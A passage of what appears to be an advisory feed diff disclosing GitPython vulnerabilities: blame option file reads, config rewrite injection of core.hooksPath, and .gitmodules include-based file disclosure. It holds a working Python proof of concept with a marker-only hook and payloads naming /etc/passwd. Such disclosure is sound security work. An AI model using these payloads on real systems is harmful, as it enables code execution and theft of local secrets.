+<p>Prefer an allowlist of blame options; at minimum add <code>--contents</code>/<code>-S</code> (and any other path-taking blame options) to <code>unsafe_git_revision_options</code>, and make the membership rule "the option takes a filesystem path" rather than "the option writes output".</p>
+<hr>
+<p>Reported by <strong>zx (Jace)</strong> — GitHub: @manus-use</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/gitpython-developers/GitPython/security/advisories/GHSA-5xxx-qhh7-9287">https://github.com/gitpython-developers/GitPython/security/advisories/GHSA-5xxx-qhh7-9287</a></li>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-78678">https://nvd.nist.gov/vuln/detail/CVE-2026-78678</a></li>
+<li><a href="https://github.com/pypa/advisory-database/tree/main/vulns/gitpython/PYSEC-2026-3788.yaml">https://github.com/pypa/advisory-database/tree/main/vulns/gitpython/PYSEC-2026-3788.yaml</a></li>
+<li><a href="https://www.vulncheck.com/advisories/gitpython-before-arbitrary-file-read-via-repo-blame">https://www.vulncheck.com/advisories/gitpython-before-arbitrary-file-read-via-repo-blame</a></li>
+<li><a href="https://github.com/advisories/GHSA-5xxx-qhh7-9287">https://github.com/advisories/GHSA-5xxx-qhh7-9287</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-5xxx-qhh7-9287</uri>
+        </author>
+        <category label="severity" term="MODERATE"/>
+        <published>2026-09-08T18:41:31.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[gitpython] Duplicate Advisory: GitPython: Incomplete unsafe_git_revision_options denylist omits --contents/-S, enabling arbitrary file read via Repo.blame()]]></title>
+        <id>https://github.com/advisories/GHSA-89ff-m8wv-p99r</id>
+        <link href="https://github.com/advisories/GHSA-89ff-m8wv-p99r"/>
+        <updated>2026-09-08T18:41:22.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="duplicate-advisory">Duplicate Advisory</h2>
+<p>This advisory has been withdrawn because it is a duplicate of&nbsp;GHSA-5xxx-qhh7-9287. This link is maintained to preserve external references.</p>
+<h2 id="original-description">Original Description</h2>
+<p>GitPython versions before 3.1.59 contain an incomplete denylist in the unsafe_git_revision_options guard that omits --contents and -S options, allowing attackers to read arbitrary files by passing these options to Repo.blame(). Attackers can supply revision values like --contents=/etc/passwd to leak file contents through the blame result returned to the caller.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/gitpython-developers/GitPython/security/advisories/GHSA-5xxx-qhh7-9287">https://github.com/gitpython-developers/GitPython/security/advisories/GHSA-5xxx-qhh7-9287</a></li>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-78678">https://nvd.nist.gov/vuln/detail/CVE-2026-78678</a></li>
+<li><a href="https://www.vulncheck.com/advisories/gitpython-before-arbitrary-file-read-via-repo-blame">https://www.vulncheck.com/advisories/gitpython-before-arbitrary-file-read-via-repo-blame</a></li>
+<li><a href="https://github.com/advisories/GHSA-89ff-m8wv-p99r">https://github.com/advisories/GHSA-89ff-m8wv-p99r</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-89ff-m8wv-p99r</uri>
+        </author>
+        <category label="severity" term="HIGH"/>
+        <published>2026-08-25T03:32:11.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[GitPython] GitPython: Dormant multi-line git-config values are corrupted into live injected directives (e.g. core.hooksPath) on any unrelated GitConfigParser write, enabling RCE]]></title>
+        <id>https://github.com/advisories/GHSA-284h-m62q-gf8w</id>
+        <link href="https://github.com/advisories/GHSA-284h-m62q-gf8w"/>
+        <updated>2026-09-08T18:39:42.000Z</updated>
+        <content type="html"><![CDATA[<ul>
+<li><strong>CWE:</strong> CWE-88 (Argument Injection) / CWE-94 (Code Injection) — via a read-then-corrupt-on-rewrite config round trip, not a direct setter argument</li>
+<li><strong>Affected component:</strong> <code>git/config.py</code> — <code>GitConfigParser._read()</code> (multi-line value decoding, lines 444-541, esp. <code>string_decode()</code> at line 460 and its call sites at 519/541) and <code>GitConfigParser._write()</code>/<code>write_section()</code> (serialization, lines ~694-712, esp. line 708)</li>
+<li><strong>Affected version:</strong> GitPython at HEAD (<code>9729ed3b948f2bde09f1f188c5311e172212b67e</code>, 2026-08-05, VERSION <code>3.1.58</code>)</li>
+</ul>
+<h2 id="reachability">Reachability</h2>
+<p>GitPython added <code>UNSAFE_CONFIG_CHARS_RE</code> / <code>_value_to_string_safe()</code> / <code>_assure_config_name_safe()</code> guards (commits <code>c417af46</code>, <code>1ed1b924</code>, <code>a495ccd3</code>, and PR #2176) to reject a Python string containing a raw <code>\r</code>/<code>\n</code>/NUL byte, or syntax-bearing characters, when it is passed as an <strong>argument</strong> to <code>set()</code>, <code>set_value()</code>, <code>add_value()</code>, or <code>add_section()</code>. This closed the four config-injection GHSAs above.</p>
+<p>That guard is applied only on the write-argument surface. It is never consulted for values that entered <code>GitConfigParser._sections</code> via <code>_read()</code> — i.e. values that came from parsing an on-disk config file. And <code>_read()</code> legitimately supports standard, spec-compliant git config syntax for multi-line values: a quoted value that is not closed on the same physical line continues onto the next physical line (git's own backslash-continuation syntax), and <code>string_decode()</code> (<code>.decode('unicode_escape')</code>) decodes a literal two-character <code>\n</code> <strong>escape sequence</strong> inside such a value into a real embedded LF character in the resulting Python string. No raw control byte is ever written to disk to achieve this — it's the same syntax real <code>git</code> itself uses and accepts.</p>
+<p>The bug is in what happens when that <code>GitConfigParser</code> is later <strong>flushed</strong>: <code>write_section()</code> (line ~694) calls the <em>unsafe</em> <code>self._value_to_string(v)</code> — not <code>_value_to_string_safe()</code> — and "handles" any embedded newline in the value with <code>.replace("\n", "\n\t")</code> (line 708), emitting a bare, unquoted <code>&lt;real newline&gt;&lt;tab&gt;</code> in the output file with no re-quoting and no backslash-continuation marker. Real git does <strong>not</strong> treat an indentation-only continuation the way GitPython's writer assumes — a value only continues across physical lines when the <em>previous</em> line ends in a literal <code>\</code> immediately before the newline. So the moment <code>write_section()</code> re-serializes a previously-decoded multi-line value this way, the second half of that value becomes an <strong>independent, new config line</strong> the next time anyone (GitPython or real <code>git</code>) parses the file. If an attacker chooses the dormant value's content to be <code>&lt;anything&gt;\nhooksPath = &lt;attacker path&gt;</code>, that second line is parsed as a brand-new <code>core.hooksPath = &lt;attacker path&gt;</code> directive — live, real Git configuration, not a value.</p>
+<p><code>core.hooksPath</code> is honored by essentially every hook-firing git operation (<code>commit</code>, <code>checkout</code>, <code>merge</code>, <code>push</code>, <code>rebase</code>, ...), giving arbitrary code execution the next time the host application performs any hook-triggering operation.</p>
+<h2 id="root-cause">Root cause</h2>
+<p><code>GitConfigParser</code>'s injection guard is asymmetric: it hardens every <em>write-argument</em> entry point (the fix for the four sibling GHSAs) but never hardens the <strong>read → corrupt-on-rewrite round trip</strong>. A value that is 100% legitimate and inert as parsed from disk becomes a newly-injected directive purely through GitPython's own broken re-serialization logic (<code>write_section()</code> using the unsafe value-to-string path plus a continuation scheme real git doesn't recognize). The <code>c417af46</code> commit message even states its intent explicitly: <em>"This preserves existing read behavior for config files that already contain multiline values while preventing GitPython from writing new unsafe values"</em> — i.e. the maintainers consciously scoped the fix to the write-argument surface and did not address what happens when an already-resident multi-line value gets rewritten.</p>
+<h2 id="exploit-path">Exploit path</h2>
+<ol>
+<li>A <code>.git/config</code> (or any file merged into it via <code>[include]</code>, see below) already contains a dormant, syntactically-legitimate multi-line quoted value, e.g.:<pre><code>[core]
+    zzz = "A\nhooksPath = ../evil-hooks\
+"
+</code></pre>
+No raw <code>\r</code>, <code>\n</code>, or NUL byte appears on disk — this is standard git quoting + backslash-continuation. Real <code>git config --get core.hookspath</code> returns nothing at this point (inert); <code>git config --get core.zzz</code> returns the decoded string <code>A\nhooksPath = ../evil-hooks</code>, identically to GitPython's own reader.</li>
+<li>The host application opens this repo with GitPython (<code>git.Repo(path)</code>, <code>read_only=False</code> implicitly for a normal <code>config_writer()</code> use) and performs <strong>any</strong> single, unrelated, legitimate config write on the same <code>GitConfigParser</code> instance — e.g. <code>repo.config_writer().set_value("user", "name", "Test User")</code>. This is one of the most ordinary operations a GitPython-based tool performs.</li>
+<li><code>GitConfigParser._write()</code>/<code>write_section()</code> re-serializes every resident value, including the dormant <code>zzz</code> entry, using the unsafe path. The file on disk now contains, verbatim:<pre><code>[core]
+    ...
+    zzz = A
+    hooksPath = ../evil-hooks
+</code></pre>
+</li>
+<li>Real <code>git config --get core.hookspath</code> now returns <code>../evil-hooks</code> — a key that did not exist before step 2, created purely by GitPython's own write.</li>
+<li>The next hook-firing git operation (e.g. <code>git commit</code>) executes <code>../evil-hooks/pre-commit</code> (or whatever hook name the operation looks for), i.e. arbitrary attacker-chosen code execution.</li>
+</ol>
+<h2 id="impact">Impact</h2>
+<p>Arbitrary code execution, on par with (and more directly triggered than) the already-accepted, High-severity <code>GHSA-mv93-w799-cj2w</code>/<code>GHSA-v87r-6q3f-2j67</code> "Newline injection... enables RCE via core.hooksPath" advisories, and requiring <strong>no unsafe caller argument at all</strong> — only an attacker-influenced config file plus one ordinary, unrelated write.</p>
+<h2 id="preconditions">Preconditions</h2>
+<ul>
+<li>A config file GitPython opens read-write already contains an attacker-chosen, syntactically-valid multi-line value shaped like <code>&lt;anything&gt;\n&lt;injected-key&gt; = &lt;injected-value&gt;</code>. Realistic delivery:<ol>
+<li><strong>Pre-existing <code>.git</code> directory shipped with a repository</strong> — vendored/template repos, CI workspace/layer caches that preserve <code>.git</code>, "repo" tarball/zip distributions that include <code>.git/config</code>. The poisoned value sits directly in <code>.git/config</code>.</li>
+<li><strong>The documented shared-config <code>[include]</code> pattern</strong> (<code>[include] path = ../&lt;repo-tracked-file&gt;</code>, pointing at a file inside the working tree) — <code>GitConfigParser.read()</code> merges included files' sections into the same <code>_sections</code> dict used for writing, so a malicious public repository can ship the poisoned value inside a normal tracked file and have it activated the first time any GitPython-based tool performs any unrelated config write after clone (this requires the victim's own <code>.git/config</code> to already reference the include, e.g. via project setup tooling that adds <code>include.path</code>).</li>
+<li><strong>Any host application that opens an attacker-influenced config file for read-write and later performs a legitimate write</strong> — the exact trust-boundary the maintainers already accepted as realistic for <code>GHSA-v87r-6q3f-2j67</code> (their writeup cites MLRun's <code>project.push()</code>).</li>
+</ol>
+</li>
+<li>No authentication/role requirement inside GitPython itself.</li>
+</ul>
+<h2 id="evidence">Evidence</h2>
+<ul>
+<li><code>git/config.py:460</code> (<code>string_decode</code>), invoked at <code>git/config.py:519</code> and <code>:541</code> inside <code>_read()</code>'s multi-line handling — decodes <code>unicode_escape</code>, turning a literal <code>\n</code> escape into a real embedded LF.</li>
+<li><code>git/config.py:~694-712</code> (<code>_write()</code>/<code>write_section()</code>) — uses <code>self._value_to_string(v)</code> (unsafe variant) and <code>.replace("\n", "\n\t")</code> with no re-quoting.</li>
+<li><code>c417af46</code> (the CR/LF/NUL guard commit) touches only the setter path and explicitly states it preserves existing <em>read</em> behavior for multi-line values, per its own commit message.</li>
+<li><code>git log -S"string_decode"</code>, <code>-S"write_section"</code>, <code>-S'replace("\n", "\n\t")'</code> on <code>git/config.py</code> show these code paths have only ever been touched by non-security formatting/refactor commits (<code>a5fc1d86</code>, <code>b825dc74</code>, <code>cb68eef0</code>, <code>21ec5299</code>), never by a security fix.</li>
+<li>PoC (<code>gitpython-002-poc.py</code>, embedded below) reproduces the full chain end-to-end against this exact checkout: dormant value → one unrelated <code>config_writer()</code> write → <code>core.hookspath</code> becomes live per real <code>git config --get</code> → a subsequent <code>git commit</code> executes the injected hook and writes a benign marker file.</li>
+</ul>
+<h2 id="false-positive-check-adversarial-re-read">False-positive check (adversarial re-read)</h2>
+<ul>
+<li><strong>Is this just a repeat of the four already-fixed config-injection GHSAs?</strong> No — all four require the <em>caller</em> to pass a Python string containing a raw control character or forbidden syntax character as an argument to a setter; all four are now blocked by <code>UNSAFE_CONFIG_CHARS_RE</code>/<code>VALID_CONFIG_OPTION_NAME_RE</code>/the section quote-state-machine. This finding requires no such caller argument: the payload is smuggled entirely inside a config <em>file</em> using standard, valid git escaping that the guard never inspects, and only becomes dangerous through GitPython's own unguarded re-serialization of a value it already holds. Confirmed via <code>_known-advisories.json</code> (26 entries, none withdrawn) — none describe this read→corrupt-on-rewrite mechanism.</li>
+<li><strong>Does real git actually round-trip this value safely (i.e. is this a GitPython-only bug, not a "normal" file)?</strong> Yes, confirmed empirically: after the same crafted <code>.git/config</code> is rewritten by <em>real</em> <code>git config user.name Test2</code> (a control test), the multi-line <code>zzz</code> entry is preserved byte-for-byte in its original quoted/continuation form — only GitPython's writer corrupts it.</li>
+<li><strong>Is there a guard elsewhere that would catch the resulting bare <code>hooksPath = ...</code> line before it's trusted?</strong> No — once on disk, it is indistinguishable from a directive the user set intentionally; <code>core.hooksPath</code> is honored unconditionally by git's hook-invocation machinery.</li>
+<li><strong>Does this require an unrealistic precondition?</strong> The precondition (a config file with attacker-influenced content, later legitimately rewritten) mirrors the exact threat model the maintainers already treated as realistic and fixed for <code>GHSA-v87r-6q3f-2j67</code>.</li>
+<li>Verdict: no concrete blocker found. <strong>CONFIRMED</strong> — reproduced independently end-to-end (dormant value in place → benign unrelated <code>config_writer()</code> write → <code>core.hookspath</code> live per real git → hook fires on <code>git commit</code>, marker file written).</li>
+</ul>
+<h2 id="remediation">Remediation</h2>
+<p>Either (a) make <code>write_section()</code>/<code>_write()</code> use <code>_value_to_string_safe()</code> (or equivalent re-quoting) for <strong>every</strong> resident value, including those that originated from <code>_read()</code>, so an embedded newline is always re-emitted as a properly quoted+backslash-continued value rather than a bare new line, or (b) reject/neutralize embedded control characters in values at read time before they can reach <code>_sections</code> at all if the parser is opened in <code>read_only=False</code> mode, or (c) canonicalize output using git's own <code>git config --file &lt;path&gt; --replace-all</code> semantics instead of a hand-rolled writer. Option (a) is the most surgical fix and matches the spirit of <code>_value_to_string_safe()</code> already used on the setter path.</p>
+<h2 id="confidence">Confidence</h2>
+<p>High. Root cause independently re-derived and confirmed by direct code reading; full exploit chain (dormant value → benign unrelated write → live <code>core.hookspath</code> → hook execution with a benign marker) reproduced twice, independently, against the current HEAD.</p>
+<h2 id="proof-of-concept-source-gitpython-002-pocpy">Proof-of-Concept source (<code>gitpython-002-poc.py</code>)</h2>
+<pre><code class="language-python">#!/usr/bin/env python3
+"""
+GITPYTHON-002 PoC: a dormant, legitimately-encoded multi-line git-config value
+(standard quoted + backslash-continuation syntax, containing an escaped "\\n"
+that decodes to a real embedded newline in memory) is corrupted into a NEW,
+live config key the moment GitConfigParser re-serializes it during any
+unrelated write. If the smuggled second "line" looks like
+"hooksPath = &lt;attacker path&gt;", it becomes a real, active core.hooksPath after
+one unrelated GitPython config write, and fires attacker code on the next
+hook-triggering git operation (e.g. `git commit`).
+
+This is CWE-88/CWE-94 style argument/config injection, but via the READ path
+(a config file GitPython parses and later rewrites), not via a Python kwarg
+argument -- distinct from the already-fixed GHSA-mv93-w799-cj2w /
+GHSA-v87r-6q3f-2j67 / GHSA-3rp5-jjmw-4wv2 / GHSA-jm78-9fvv-mhgr, which all
+guard the setter-argument surface only.
+
+Run:
+  PYTHONPATH="&lt;repo&gt;:&lt;repo&gt;/gitdb:&lt;repo&gt;/smmap" python3 gitpython-002-poc.py &lt;workdir&gt;
+
+Benign: only writes/reads inside &lt;workdir&gt;. The "malicious" hook just writes a
+marker file; no destructive/exfiltrating payload. Exits non-zero and prints
+"NOT VULNERABLE" if the corruption / hook does not fire.
+"""
+import os
+import subprocess
+import sys
+
+
+def main():
+    workdir = sys.argv[1] if len(sys.argv) &gt; 1 else "/tmp/gitpython-002-poc"
+    repo_dir = os.path.join(workdir, "repo")
+    hooks_dir = os.path.join(workdir, "evil-hooks")
+    marker = os.path.join(workdir, "PWNED_MARKER.txt")
+
+    for p in (repo_dir, hooks_dir):
+        os.makedirs(p, exist_ok=True)
+    if os.path.exists(marker):
+        os.remove(marker)
+
+    subprocess.run(["git", "init", "-q", "-b", "main", repo_dir], check=True)
+    subprocess.run(["git", "-C", repo_dir, "config", "user.email", "test@example.com"], check=True)
+    subprocess.run(["git", "-C", repo_dir, "config", "user.name", "Test"], check=True)
+
+    # Rewrite .git/config with a dormant, 100%-valid multi-line quoted value
+    # inside [core] (before any other section). No raw CR/LF/NUL byte is
+    # written to disk here -- this is standard git config quoting +
+    # backslash-line-continuation, decoded by both real git and GitConfigParser
+    # into the Python string 'A\nhooksPath = ../evil-hooks'.
+    cfg_path = os.path.join(repo_dir, ".git", "config")
+    with open(cfg_path) as f:
+        original = f.read()
+    poisoned_entry = '\tzzz = "A\\nhooksPath = ../evil-hooks\\\n"\n'
+    # Insert right after the [core] header line so it lives in the same section.
+    new_config = original.replace("[core]\n", "[core]\n" + poisoned_entry, 1)
+    with open(cfg_path, "w") as f:
+        f.write(new_config)
+
+    # Confirm it's inert per real git before touching GitPython.
+    pre = subprocess.run(
+        ["git", "-C", repo_dir, "config", "--get", "core.hookspath"],
+        capture_output=True, text=True,
+    )
+    if pre.returncode == 0:
+        print("SETUP ERROR: core.hookspath already set before GitPython touched anything")
+        sys.exit(2)
+
+    # Malicious hook: benign marker only.
+    hook_path = os.path.join(hooks_dir, "pre-commit")
+    with open(hook_path, "w") as f:
+        f.write('#!/bin/sh\necho "PWNED-VIA-GITPYTHON-CONFIG-INJECTION" &gt; "%s"\nexit 0\n' % marker)
+    os.chmod(hook_path, 0o755)
+
+    import git  # gitpython under test
+
+    repo = git.Repo(repo_dir)
+    before = repo.config_reader().get_value("core", "zzz")
+    print("core.zzz before any GitPython write =", repr(before))
+
+    # ONE totally unrelated, benign write -- this is the only "attacker-adjacent"
+    # action required, and it is something virtually every GitPython consumer
+    # does routinely (setting an option, adding a remote, updating a branch's
+    # tracking config, ...).
+    with repo.config_writer() as cw:
+        cw.set_value("user", "name", "Test User")
+
+    post = subprocess.run(
+        ["git", "-C", repo_dir, "config", "--get", "core.hookspath"],
+        capture_output=True, text=True,
+    )
+    if post.returncode != 0:
+        print("NOT VULNERABLE: core.hookspath still absent after the unrelated write")
+        sys.exit(1)
+
+    injected_path = post.stdout.strip()
+    print("core.hookspath is now LIVE after one unrelated write:", injected_path)
+
+    # Trigger the hook with a normal commit to prove it fires.
+    with open(os.path.join(repo_dir, "file2.txt"), "w") as f:
+        f.write("change\n")
+    subprocess.run(["git", "-C", repo_dir, "add", "file2.txt"], check=True)
+    subprocess.run(
+        ["git", "-C", repo_dir, "-c", "user.email=t@example.com", "-c", "user.name=T",
+         "commit", "-q", "-m", "trigger hook"],
+        check=True,
+    )
+
+    if os.path.isfile(marker):
+        with open(marker) as f:
+            content = f.read().strip()
+        print("VULNERABLE: hook fired, marker content =", content)
+        sys.exit(0)
+    else:
+        print("NOT VULNERABLE: hook did not fire")
+        sys.exit(1)
+
+
+if __name__ == "__main__":
+    main()
+</code></pre>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/gitpython-developers/GitPython/security/advisories/GHSA-284h-m62q-gf8w">https://github.com/gitpython-developers/GitPython/security/advisories/GHSA-284h-m62q-gf8w</a></li>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-78676">https://nvd.nist.gov/vuln/detail/CVE-2026-78676</a></li>
+<li><a href="https://github.com/pypa/advisory-database/tree/main/vulns/gitpython/PYSEC-2026-3786.yaml">https://github.com/pypa/advisory-database/tree/main/vulns/gitpython/PYSEC-2026-3786.yaml</a></li>
+<li><a href="https://www.vulncheck.com/advisories/gitpython-before-remote-code-execution-via-config-injection">https://www.vulncheck.com/advisories/gitpython-before-remote-code-execution-via-config-injection</a></li>
+<li><a href="https://github.com/advisories/GHSA-284h-m62q-gf8w">https://github.com/advisories/GHSA-284h-m62q-gf8w</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-284h-m62q-gf8w</uri>
+        </author>
+        <category label="severity" term="CRITICAL"/>
+        <published>2026-09-08T18:39:40.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[GitPython] Duplicate Advisory: Dormant multi-line git-config values are corrupted into live injected directives (e.g. core.hooksPath) on any unrelated GitConfigParser write, enabling RCE]]></title>
+        <id>https://github.com/advisories/GHSA-9557-234j-7rv9</id>
+        <link href="https://github.com/advisories/GHSA-9557-234j-7rv9"/>
+        <updated>2026-09-08T18:39:18.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="duplicate-advisory">Duplicate Advisory</h2>
+<p>This advisory has been withdrawn because it is a duplicate of&nbsp;GHSA-284h-m62q-gf8w. This link is maintained to preserve external references.</p>
+<h2 id="original-description">Original Description</h2>
+<p>GitPython before 3.1.59 fails to safely re-serialize multi-line git-config values during write operations, corrupting dormant quoted values into injected directives like core.hooksPath. Attackers can craft config files with embedded newlines that become live git directives after any unrelated GitPython config write, enabling arbitrary code execution via hook invocation.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/gitpython-developers/GitPython/security/advisories/GHSA-284h-m62q-gf8w">https://github.com/gitpython-developers/GitPython/security/advisories/GHSA-284h-m62q-gf8w</a></li>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-78676">https://nvd.nist.gov/vuln/detail/CVE-2026-78676</a></li>
+<li><a href="https://www.vulncheck.com/advisories/gitpython-before-remote-code-execution-via-config-injection">https://www.vulncheck.com/advisories/gitpython-before-remote-code-execution-via-config-injection</a></li>
+<li><a href="https://github.com/advisories/GHSA-9557-234j-7rv9">https://github.com/advisories/GHSA-9557-234j-7rv9</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-9557-234j-7rv9</uri>
+        </author>
+        <category label="severity" term="CRITICAL"/>
+        <published>2026-08-25T03:32:10.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[GitPython] GitPython: Arbitrary local file content disclosure via [include] directive in untrusted .gitmodules (SubmoduleConfigParser never disables merge_includes)]]></title>
+        <id>https://github.com/advisories/GHSA-7833-fr7j-v32q</id>
+        <link href="https://github.com/advisories/GHSA-7833-fr7j-v32q"/>
+        <updated>2026-09-08T18:38:53.000Z</updated>
+        <content type="html"><![CDATA[<h1 id="high-arbitrary-local-file-content-disclosure-via-include-directive-in-untrusted-gitmodules-submoduleconfigparser-never-disables-merge_includes">[HIGH] Arbitrary local file content disclosure via <code>[include]</code> directive in untrusted <code>.gitmodules</code> (<code>SubmoduleConfigParser</code> never disables <code>merge_includes</code>)</h1>
+<ul>
+<li><strong>CWE:</strong> CWE-200 (Exposure of Sensitive Information) / CWE-73 (External Control of File Name or Path)</li>
+<li><strong>Affected component:</strong> <code>git/objects/submodule/base.py</code>, <code>Submodule._config_parser()</code> (<del>line 273) constructing <code>SubmoduleConfigParser(fp_module, read_only=read_only)</code>; <code>git/config.py</code>, <code>GitConfigParser.__init__</code> (<code>merge_includes</code> default), <code>GitConfigParser.read()</code>/<code>_included_paths()</code> (include-path resolution, ~lines 630-685), <code>GitConfigParser._read()</code> (</del>line 493-498, <code>MissingSectionHeaderError</code>)</li>
+<li><strong>Affected version:</strong> GitPython at HEAD (<code>9729ed3b948f2bde09f1f188c5311e172212b67e</code>, 2026-08-05, VERSION <code>3.1.58</code>)</li>
+</ul>
+<h2 id="reachability">Reachability</h2>
+<p><code>GitConfigParser.__init__</code> defaults <code>merge_includes=True</code>: any config file it parses has its <code>[include]</code> (and, when a <code>repo=</code> is supplied, <code>[includeIf ...]</code>) directives followed and merged in. The maintainers already recognized this as dangerous for one specific case and fixed it in commit <code>41ecc6a4</code> ("Disable merge_includes in config writers"), which passes <code>merge_includes=False</code> when <code>Repo.config_writer()</code> builds its parser (<code>git/repo/base.py</code>).</p>
+<p>That fix never touched <code>Submodule._config_parser()</code>. This method builds the parser used for <strong>every</strong> read of a repo's submodule configuration — <code>repo.submodules</code>, <code>Submodule.iter_items()</code>, <code>Submodule.config()</code> — via <code>SubmoduleConfigParser(fp_module, read_only=read_only)</code>, passing neither <code>merge_includes=False</code> nor <code>repo=</code>. The <code>True</code> class default is therefore inherited unchanged, and <code>fp_module</code> here is <code>.gitmodules</code> — <strong>the single most attacker-controlled config file in the entire codebase</strong>, since it ships verbatim as tracked content inside any cloned repository.</p>
+<p><code>GitConfigParser.read()</code>'s include-path resolution (<del>line 662-680) performs no containment check: <code>osp.isabs(include_path)</code> short-circuits the path join entirely for an absolute path, and a relative path is joined with <code>osp.join(osp.dirname(file_path), include_path)</code> / <code>osp.normpath()</code>'d with no check that the result stays under the repository. `</del><code>is expanded via</code>osp.expanduser<code>. The only gate before opening is </code>os.access(include_path, os.R_OK)` — a readability check, not a path restriction.</p>
+<p>Once opened, <code>GitConfigParser._read()</code> parses the target file as git-config INI. If the first non-blank/non-comment line is not a <code>[section]</code> header — true of virtually any non-gitconfig file (source code, <code>/etc/passwd</code>, <code>.env</code> files, credential files, logs, JSON/YAML) — it raises <code>configparser.MissingSectionHeaderError(fpname, lineno, line)</code>. Python's stdlib formats this exception's <code>str()</code> as <code>"File contains no section headers.\nfile: %r, line: %d\n%r" % (fpname, lineno, line)</code> — it embeds the <strong>verbatim content</strong> of that file's first line in the exception message. <code>Submodule.iter_items()</code> catches only <code>(IOError, BadName)</code>, not <code>configparser.Error</code>, so this exception propagates straight out of the ordinary, read-only <code>repo.submodules</code> call.</p>
+<h2 id="root-cause">Root cause</h2>
+<p>Parity gap between two config-parser construction sites for the exact same footgun: <code>Repo.config_writer()</code> was hardened against <code>merge_includes</code> in 2023 (<code>41ecc6a4</code>); <code>Submodule._config_parser()</code> — which parses <code>.gitmodules</code>, content that is <em>always</em> attacker-controlled the moment a repository is cloned from an untrusted source — was never given the same treatment. (The submodule <em>write</em>-mode config parser at <code>git/objects/submodule/base.py</code> for <code>.git/modules/&lt;name&gt;/config</code> — a different, locally-generated file — has correctly passed <code>merge_includes=False</code> since 2022, underscoring that the omission for <code>.gitmodules</code> reads looks like an oversight rather than a considered exception.)</p>
+<h2 id="exploit-path">Exploit path</h2>
+<ol>
+<li>Attacker crafts a repository whose <code>.gitmodules</code> contains a legitimate-looking <code>[submodule ...]</code> section plus:<pre><code>[include]
+    path = /etc/passwd
+</code></pre>
+(an absolute path bypasses any traversal reasoning entirely; a relative <code>../../../../etc/passwd</code>-style path works too).</li>
+<li>Victim performs the extremely common, entirely read-only operation of enumerating a cloned repo's submodules: <code>list(repo.submodules)</code> (or any <code>for sm in repo.submodules</code>) — no <code>update()</code>, <code>init()</code>, or checkout of any kind required.</li>
+<li><code>SubmoduleConfigParser</code> (inheriting <code>merge_includes=True</code>) follows the <code>[include]</code> directive, opens <code>/etc/passwd</code>, and <code>GitConfigParser._read()</code> raises <code>MissingSectionHeaderError</code> whose message embeds <code>/etc/passwd</code>'s first line verbatim.</li>
+<li>This exception surfaces wherever the host application observes exceptions from GitPython — CI logs, error pages, exception trackers, or any dependency-scanner/code-review-bot/hosting-platform tool built on <code>repo.submodules</code> — disclosing the targeted file's first line to the attacker (directly, or indirectly via any channel that echoes the error).</li>
+</ol>
+<h2 id="impact">Impact</h2>
+<p>Non-blind local file content disclosure (first line) of any file readable by the victim process, triggered purely by attacker-controlled repository content and one routine, read-only GitPython call. Bounded to one line per triggering file (parsing aborts at the first <code>MissingSectionHeaderError</code>), but that line very often <em>is</em> the secret — <code>.env</code> files (<code>DATABASE_URL=...</code>, <code>API_KEY=...</code>), single-line credential/token files, <code>/etc/passwd</code>'s root entry for host fingerprinting. The primitive additionally serves as a generic error-based file-existence oracle for arbitrary host paths. This is materially stronger than the already-fixed, explicitly <strong>blind</strong> <code>GHSA-cwvm-v4w8-q58c</code> ("Blind local file inclusion", CVSS 4.0, <code>git/refs/symbolic.py</code> ref-name resolution) — that advisory's own writeup states it cannot disclose content; this one does, verbatim, via a different module (<code>git/config.py</code>'s include resolution).</p>
+<h2 id="preconditions">Preconditions</h2>
+<ul>
+<li>Victim clones (or otherwise opens with GitPython) a repository whose <code>.gitmodules</code> is attacker-controlled — the default trust model for any tool that processes third-party repositories (dependency scanners, CI, code hosting/review bots, "audit this repo" utilities — exactly the class of application GitPython itself is built for).</li>
+<li>Victim performs any operation that touches <code>repo.submodules</code> — one of the most ordinary GitPython operations, requiring no submodule <code>update</code>/<code>init</code>/checkout.</li>
+<li>No authentication/role requirement inside GitPython itself.</li>
+</ul>
+<h2 id="evidence">Evidence</h2>
+<ul>
+<li><code>git/config.py</code> — <code>GitConfigParser.__init__</code> defaults <code>merge_includes=True</code>.</li>
+<li><code>git/objects/submodule/base.py:273</code> — <code>SubmoduleConfigParser(fp_module, read_only=read_only)</code> passes neither <code>merge_includes</code> nor <code>repo=</code>; <code>git blame</code> shows this call unchanged since the class was introduced, and <code>git show 41ecc6a4</code> confirms that commit touched only <code>git/repo/base.py</code>'s <code>Repo.config_writer()</code>, never this call site.</li>
+<li><code>git/config.py</code> <code>_included_paths()</code>/<code>read()</code> (~630-685) — absolute include paths bypass the join/normpath entirely (<code>osp.isabs()</code> short-circuit); no repository-boundary containment check exists anywhere in this path.</li>
+<li><code>git/config.py</code> <code>_read()</code> (~493-498) — raises <code>cp.MissingSectionHeaderError(fpname, lineno, line)</code> with the raw file line embedded, matching Python stdlib <code>configparser</code>'s own <code>__str__</code> behavior.</li>
+<li><code>Submodule.iter_items()</code> catches only <code>(IOError, BadName)</code> — <code>configparser.Error</code> (the base of <code>MissingSectionHeaderError</code>) is not swallowed.</li>
